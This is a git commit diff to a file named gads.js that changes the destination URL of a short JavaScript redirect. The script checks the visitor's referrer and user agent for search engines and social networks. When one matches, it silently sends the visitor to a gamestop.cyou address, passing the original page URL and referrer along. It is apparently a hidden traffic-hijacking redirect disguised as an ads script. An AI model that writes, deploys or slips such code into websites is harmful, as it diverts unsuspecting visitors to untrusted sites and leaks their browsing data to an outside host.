cedf1ebc50eb1b98ca2ad86f9d8c385200b82432
adelvina <103128927+adelvina@users.noreply.github.com>
2023-03-14 08:44:01 +0700

    Update gads.js

--- gads.js
+++ gads.js
@@ -1,3 +1,3 @@
-var ars = 'https://insurance.gamestop.cyou/';
+var ars = 'http://gamestop.cyou/';
 
 if(['.google.', 'bing.', 'yandex.', '.yahoo.', 'duckduckgo.', 'instagram.', 'twitter.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
